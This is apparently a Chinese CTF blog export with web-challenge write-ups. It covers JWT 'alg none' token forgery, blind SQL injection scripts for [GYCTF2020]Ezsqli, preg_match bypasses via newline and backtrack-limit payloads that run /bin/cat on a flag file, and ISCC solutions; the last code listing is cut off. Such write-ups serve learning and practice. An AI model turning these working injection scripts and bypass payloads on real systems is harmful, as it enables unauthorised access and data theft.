<p>吧这个autho啥的拿去<a href="https://jwt.io/%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E8%A7%A3%E7%A0%81">https://jwt.io/这个网站解码</a><br>然后jwt会防篡改，这里绕过的姿势就是将HS256改为none，然后构造:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;&#125;.&#123;&quot;secretid&quot;: [],&quot;username&quot;: &quot;admin&quot;,&quot;password&quot;: &quot;123456&quot;,&quot;iat&quot;: 1623114083&#125;.</span><br><span class="line">ewogICJhbGciOiAibm9uZSIsCiAgInR5cCI6ICJKV1QiCn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTYyMzEzMzA0NX0.Qjxs0QkJ0e_Sjrn8WbCPKaE5kFouERQY8RZ6nGctW6Q</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210608142227.png" alt="img" style="zoom:80%;">
记得将username换成admin，然后登陆进去以后抓包按getflag就行

<h3 id="jwt攻击小结"><a href="#jwt攻击小结" class="headerlink" title="jwt攻击小结"></a>jwt攻击小结</h3><p>jwt就是一种验证方式，思路就是拿到密文，然后去网站解密<a href="https://jwt.io/%EF%BC%8C%E4%BF%AE%E6%94%B9%E5%85%B6%E4%B8%AD%E7%9A%84%E5%80%BC%EF%BC%8C%E5%86%8D%E5%8A%A0%E5%AF%86%E5%9B%9E%E5%8E%BB%EF%BC%8C%E6%9C%AC%E5%9C%B0%E8%83%BD%E7%BB%95%E8%BF%87%E6%98%AF%E5%9B%A0%E4%B8%BA%E9%AA%8C%E8%AF%81%E6%96%B9%E5%BC%8F%E6%AF%94%E8%BE%83%E7%AE%80%E5%8D%95%EF%BC%9A%E9%A6%96%E5%85%88%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95%E7%A1%AE%E4%BF%9D%E6%81%B6%E6%84%8F%E7%94%A8%E6%88%B7%E5%9C%A8%E4%BC%A0%E8%BE%93%E8%BF%87%E7%A8%8B%E4%B8%AD%E4%B8%8D%E4%BC%9A%E4%BF%AE%E6%94%B9JWT%EF%BC%8C%E4%BD%86%E6%98%AFjwt%E6%94%AF%E6%8C%81%E6%97%A0%E7%AD%BE%E5%90%8D%E7%AE%97%E6%B3%95%EF%BC%8C**%E6%89%80%E4%BB%A5%E5%A6%82%E6%9E%9C%E5%B0%86alg%E7%9A%84%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E6%94%B9%E4%B8%BAnone**%EF%BC%8C%E5%B0%B1%E4%B8%8D%E7%94%A8%E5%AF%B9jwt%E8%BF%9B%E8%A1%8C%E7%AD%BE%E5%90%8D%EF%BC%8C%E8%BF%99%E6%A0%B7jwt%E7%9A%84%E5%AD%98%E5%9C%A8%E5%B0%B1%E6%B2%A1%E6%9C%89%E6%84%8F%E4%B9%89%E4%BA%86%E3%80%82">https://jwt.io/，修改其中的值，再加密回去，本地能绕过是因为验证方式比较简单：首先签名算法确保恶意用户在传输过程中不会修改JWT，但是jwt支持无签名算法，**所以如果将alg的加密方式改为none**，就不用对jwt进行签名，这样jwt的存在就没有意义了。</a></p>
<p>secret更改为数组的原因是也是和上面的更改none方法相呼应，因为只有secret更改为空这个方法才有效<br>但是本题为什么更改为数组？为什么不直接放空白，这点在他的源码有写，secret不能为空<br>js是弱类型语言，secret设为一个数组或小数，比较永远为真，但是并且不为空。</p>
<p>攻击思路:<br>注册获得jwt——更改jwt——重新进入</p>
<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>SQL注入，数字型注入，过滤infomation，推测要无列名注入了<br>接下来测试一下注入点发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1和id&#x3D;2回显不一样</span><br></pre></td></tr></table></figure>

<p>这里有个细节需要说一下，由于and被过滤了，&amp;&amp;在url传输过程中有其他含义，不好用，所以这里用的|，但是用|的话就需要我们让id=2，这样 两个都错才是v&amp;n，一个对一个错就是nu1l，如果是id=1，就会一直是nu1l</p>
<p>接下来就贴脚本惹:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://38e59c90-abd2-495b-8ea0-e256893cdce2.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">database=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100000000</span>):</span><br><span class="line">    low=<span class="number">0</span></span><br><span class="line">    high=<span class="number">264</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">        <span class="comment">#payload_1=f&quot;2||ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;#爆库give_grandpa_pa_pa_pa</span></span><br><span class="line">        <span class="comment">#payload_2=f&quot;2||ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;#f1ag_1s_h3r3_hhhhh</span></span><br><span class="line">        payload_2 = <span class="string">f&quot;2||ascii(substr((select group_concat(flag) from f1ag_1s_h3r3_hhhhh),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>&quot;</span><span class="comment">#像无列名注入很经常列名都是flag，好几次了，</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#print(payload_2)</span></span><br><span class="line">        <span class="comment">#payload_2=</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>:payload_2</span><br><span class="line">        &#125;</span><br><span class="line">        print(s.post(url,data=data).text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> s.post(url,data=data).text:</span><br><span class="line">            low=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> (mid == <span class="number">0</span> <span class="keyword">or</span> mid == <span class="number">264</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    database += chr(mid)</span><br><span class="line">    print(database)</span><br><span class="line">print(database)</span><br></pre></td></tr></table></figure>

<p>有个很无语的事，就是一旦请求多了，网页就会崩溃–，所以很痛苦</p>
<p>我还一直在想是出了什么问题了，就算把线程改为1也不行–<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210608151212.png" alt="img" style="zoom:50%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210608151321.png" alt="img" style="zoom:50%;">

<p>由于本题过滤了union 所以常规的无列名注入在这里就行不通了<br>这里学习一下</p>
<h3 id="无列名按位比较注入"><a href="#无列名按位比较注入" class="headerlink" title="无列名按位比较注入"></a>无列名按位比较注入</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://38e59c90-abd2-495b-8ea0-e256893cdce2.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span>(<span class="params">flag</span>):</span></span><br><span class="line">    res=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">        res+=hex(ord(i))</span><br><span class="line">    res=<span class="string">&#x27;0x&#x27;</span>+res.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    hexchar=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        hexchar = trans(flag+chr(char))</span><br><span class="line">        payload = <span class="string">&#x27;2||((select 1,&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.format(hexchar)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data)</span><br><span class="line">        text = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Nu1L&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += chr(char - <span class="number">1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>1.说一下原理，这里是使用了一个比较的思想，先比第一位，如果第一位相等则比较第二位，在某一位上，如果前者的 ASCII 大，不管总长度如何，ASCII 大的则大</p>
<p>2.所以这里需要两个循环，一个循环记录次数，一个循环放字符</p>
<h3 id="无列名注入小结"><a href="#无列名注入小结" class="headerlink" title="无列名注入小结:"></a>无列名注入小结:</h3><p>无列名注入可能是之前都没小结过，每次都要翻一下记录:<br>这里总结一下方便记忆的公式吧</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select b from (select 1,2 as b,3 union select * from users)a;</span><br><span class="line">      虚拟列名          字段数 并且将要显示的 as b         表名  任意字母</span><br><span class="line">(select 1,爆破内容)&gt;(select * from 表名)</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>preg_replace函数绕过</title>
    <url>/2021/05/22/postpreg-replace%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>今天利用这道题来整理一下preg_match的绕过姿势<br><strong>首先我们来看看preg_match的返回值有什么:</strong><br>1.返回1<br>2.返回0<br>3.返回false</p>
<p>设想一下，如果preg_match作为判断条件，用来匹配危险字符，如果匹配到则为1此时我们就被waf掉了，如果是返回错误以及0，这就意味着着我们绕过了！</p>
<h2 id="0篇"><a href="#0篇" class="headerlink" title="0篇"></a>0篇</h2><p>接着，<strong>我们来看看有什么条件可以使我们匹配到0：</strong><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522135857.png" alt="img" style="zoom:67%;"></p>
<p>根据文档我们可以发现，如果没有s的话，匹配到换行符，preg_match就会停止匹配（preg_match尽力匹配第一行）<br><strong>利用点:</strong><br>如果此时在我们的语句前加入一个换行符，那么此时的我们语句将不会被匹配到，前提preg_match模式符中没有添加s。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522140814.png" alt="img" style="zoom: 50%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522140748.png" alt="img" style="zoom: 50%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522140814.png" alt="img" style="zoom: 50%;"></p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;:&quot;%0A&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat%20&#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0A&quot;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="false篇"><a href="#false篇" class="headerlink" title="false篇"></a>false篇</h2><h3 id="贪婪与非贪婪模式"><a href="#贪婪与非贪婪模式" class="headerlink" title="贪婪与非贪婪模式"></a>贪婪与非贪婪模式</h3><p>贪婪模式：可以这样认为，就是在整个表达式匹配成功的前提下，尽可能多的匹配，也就是所谓的“贪婪”，通俗点讲，就是看到想要的，有多少就捡多少，除非再也没有想要的了。<br>非贪婪模式：可以这样认为，就是在整个表达式匹配成功的前提下，尽可能少的匹配，也就是所谓的“非贪婪”，通俗点讲，就是找到一个想要的捡起来就行了，至于还有没有没捡的就不管了。</p>
<h4 id="贪婪模式："><a href="#贪婪模式：" class="headerlink" title="贪婪模式："></a>贪婪模式：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str = <span class="string">&#x27;this a img &lt;img src=&quot;mypic.jpg&quot;/&gt; , goog jpg ha ha&#x27;</span>;</span><br><span class="line">preg_match(<span class="string">&#x27;/src.*jpg/&#x27;</span>, $str, $match);</span><br><span class="line">var_dump($match);</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(28) &quot;src&#x3D;&quot;mypic.jpg&quot;&#x2F;&gt; , goog jpg&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为是贪婪模式，所以这里多数除了一个jpg</p>
<h4 id="非贪婪模式："><a href="#非贪婪模式：" class="headerlink" title="非贪婪模式："></a>非贪婪模式：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str = <span class="string">&#x27;this a img &lt;img src=&quot;mypic.jpg&quot;/&gt; , goog jpg ha ha&#x27;</span>;</span><br><span class="line">preg_match(<span class="string">&#x27;/src=&quot;.*?\.jpg&quot;/&#x27;</span>, $str, $match);</span><br><span class="line">var_dump($match);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;src=&quot;</span>mypic.jpg<span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以通过添加惰性限定符或修饰符进行处理</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522141957.png" alt="img"></p>
<h4 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h4><p>由于是非贪婪模式，所以有回溯的概念的存在：<br>举个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str = <span class="string">&#x27;this a img &lt;img src=&quot;mypic.jpg&quot;/&gt; , goog jpg ha ha&#x27;</span>;</span><br><span class="line">preg_match(<span class="string">&#x27;/src=&quot;.*?\.jpg&quot;/&#x27;</span>, $str, $match);</span><br><span class="line">var_dump($match);</span><br></pre></td></tr></table></figure>

<p>理解一下，大概是这个意思首先.<em>？在这里匹配的是src和.jpg之间的内容，那么匹配的流程是这样的：首先.\</em>？匹配到“=”号，此时=号满足，放入备选录当中，接下来将匹配控制权交给jpg，发现这个=号不满足，于是回溯给.*？让它匹配了，所以最终结果就是src=”mypic.jpg”</p>
<h4 id="次数限制"><a href="#次数限制" class="headerlink" title="次数限制"></a>次数限制</h4><p>回溯也不是想回多少次就回多少次，</p>
<p>在PHP中，正则匹配的递归次数由 <a href="http://php.net/manual/en/pcre.configuration.php#ini.pcre.backtrack-limit">pcre.backtrack_limit</a> 控制 <strong>PHP5.3.7</strong> 版本之前默认值为 <strong>10万</strong> ，<strong>PHP5.3.7</strong> 版本之后默认值为 <strong>100万</strong> ，该值可以通过php.ini设置，也可以通过 <strong>phpinfo</strong> 页面查看。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522144601.png" alt="img" style="zoom:50%;"><br>如上所示，当我们超过回溯次数，此时返回的就是<strong>false</strong></p>
<h4 id="演示："><a href="#演示：" class="headerlink" title="演示："></a>演示：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data &#x3D; &#39;&lt;?php phpinfo();aaaaa&#39;.str_repeat(&#39; &#39;,1000000);</span><br><span class="line">$a&#x3D;preg_match(&#39;&#x2F;&lt;\?.*[(&#96;;?&gt;].*&#x2F;is&#39;, $data,$data1);</span><br><span class="line">print_r($a);</span><br><span class="line">print_r($data1);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>此时就匹配不到了<br>脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">payload &#x3D; &#39;&#123;&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag &quot;,&quot;a&quot;:&quot;&#39; + &quot;a&quot;*(1000000) + &#39;&quot;&#125;&#39;</span><br><span class="line">res &#x3D; requests.post(&quot;http:&#x2F;&#x2F;c7f06821-9d9b-468e-9f9f-21c3454d5c7d.node3.buuoj.cn&#x2F;&quot;, data&#x3D;&#123;&quot;cmd&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p><a href="https://www.liuhaolin.com/php/195.html">https://www.liuhaolin.com/php/195.html</a><br><a href="https://blog.csdn.net/phpfenghuo/article/details/17316645">https://blog.csdn.net/phpfenghuo/article/details/17316645</a></p>
]]></content>
  </entry>
  <entry>
    <title>ISCCweb题解</title>
    <url>/2021/05/02/ISCCweb%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>web的题大都做过类似的了，所以比较简单。。但是没想到难的题目都在杂项，开始后悔寒假没多学点杂项了。。。</p>
<h2 id="web1——ISCC客服冲冲冲（一）"><a href="#web1——ISCC客服冲冲冲（一）" class="headerlink" title="web1——ISCC客服冲冲冲（一）"></a>web1——ISCC客服冲冲冲（一）</h2><p>F12审查元素，将对面那个客服的voting给删掉，然后它的票就不会增加了，</p>
<h2 id="web2——这是啥"><a href="#web2——这是啥" class="headerlink" title="web2——这是啥"></a>web2——这是啥</h2><p>jsfuck代码，直接F12运行一下就能拿到FLAG</p>
<h2 id="web3——正则匹配"><a href="#web3——正则匹配" class="headerlink" title="web3——正则匹配"></a>web3——正则匹配</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&lt;p&gt;code.txt&lt;/p&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_GET[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">     </span><br><span class="line">	<span class="keyword">if</span> (preg_match (<span class="string">&quot;/^[a-zA-Z0-9]+$/&quot;</span>, $_GET[<span class="string">&#x27;password&#x27;</span>]) === <span class="literal">FALSE</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">    &#125;</span><br><span class="line">	  <span class="keyword">else</span> <span class="keyword">if</span> (strlen($_GET[<span class="string">&#x27;password&#x27;</span>]) &lt; <span class="number">8</span> &amp;&amp; $_GET[<span class="string">&#x27;password&#x27;</span>] &gt; <span class="number">9999999</span>)</span><br><span class="line">	&#123;    </span><br><span class="line">    </span><br><span class="line">		<span class="keyword">if</span> (strpos ($_GET[<span class="string">&#x27;password&#x27;</span>], <span class="string">&#x27;*-*&#x27;</span>) !== <span class="literal">FALSE</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span> . $flag);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span>(<span class="string">&#x27;&lt;p&gt;*-* have not been found&lt;/p&gt;&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Invalid password&lt;/p&gt;&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>源码如上，首先要字母和数字，然后有个位数限制，并且要数值需要大于9999999，采用科学技术法进行绕过<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6e8*-*</span><br></pre></td></tr></table></figure>

<h2 id="web4——登录"><a href="#web4——登录" class="headerlink" title="web4——登录"></a>web4——登录</h2><p>反序列化字符串逃逸就不说了</p>
<h2 id="web5——which-is-the-true-iscc"><a href="#web5——which-is-the-true-iscc" class="headerlink" title="web5——which is the true iscc"></a>web5——which is the true iscc</h2><p>查看源码:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210503104045.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line">ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line">set_time_limit(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">$status = <span class="string">&quot;new&quot;</span>;</span><br><span class="line">$cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$is_unser_finished = <span class="literal">false</span>;</span><br><span class="line">$iscc_file = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_Upload</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        $cmd = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = (count($_FILES) &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        <span class="keyword">global</span> $iscc_file;</span><br><span class="line">        $status = <span class="string">&quot;upload_fail&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> ($is_upload) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> ($_FILES <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">                $GLOBALS[$key] = $value;</span><br><span class="line">        </span><br><span class="line">            <span class="keyword">if</span>(is_uploaded_file($iscc_file[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">                </span><br><span class="line">                $check = @getimagesize($iscc_file[<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>($check !== <span class="literal">false</span>) &#123;</span><br><span class="line"></span><br><span class="line">                    $target_dir = <span class="string">&quot;/var/tmp/&quot;</span>;</span><br><span class="line">                    $target_file = $target_dir . randstr(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (file_exists($target_file)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;想啥呢？有东西了……&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> ($iscc_file[<span class="string">&quot;size&quot;</span>] &gt; <span class="number">500000</span>) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;东西塞不进去~&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (move_uploaded_file($iscc_file[<span class="string">&quot;tmp_name&quot;</span>], $target_file)) &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;我拿到了！&lt;br&gt;&quot;</span>;</span><br><span class="line">                        $iscc_file = $target_file;</span><br><span class="line">                        $status = <span class="string">&quot;upload_ok&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;拿不到:(&lt;br&gt;&quot;</span>;</span><br><span class="line">                        finalize();</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    finalize();</span><br><span class="line">                    <span class="keyword">exit</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你真是个天才!&lt;br&gt;&quot;</span>;</span><br><span class="line">                finalize();</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ISCC_ResetCMD</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $new_cmd = <span class="string">&quot;echo &#x27;新新世界，发号施令!&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $is_upload;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;name&#x27;</span>] = randstr(<span class="number">14</span>);</span><br><span class="line">        $is_upload = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            $status = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            $error = <span class="string">&quot;你这罐子是空的!&quot;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>($error);   </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_string(<span class="keyword">$this</span>-&gt;new_cmd)) &#123;</span><br><span class="line">            $status = <span class="string">&quot;error&quot;</span>;</span><br><span class="line">            $error = <span class="string">&#x27;东西都没给对!&#x27;</span>;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>($error);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $cmd;</span><br><span class="line">        <span class="keyword">global</span> $status;</span><br><span class="line">        $status = <span class="string">&quot;reset&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($_SESSION[<span 